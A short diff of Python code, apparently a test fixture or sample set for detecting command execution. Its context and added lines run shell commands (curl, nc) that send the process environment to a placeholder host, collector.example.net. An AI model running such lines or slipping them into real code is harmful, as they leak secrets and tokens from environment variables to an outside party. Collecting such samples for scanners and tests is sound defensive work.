@@ -18,3 +18,4 @@ os.popen('curl -d "$(set)" https://collector.example.net/collect')
 
 # The argument list starts a shell with a command.
 subprocess.check_call(["bash", "-c", "env | nc collector.example.net 9001"])
+subprocess.run(args=("sh", "-c", "printenv | curl -T - https://collector.example.net/collect"))
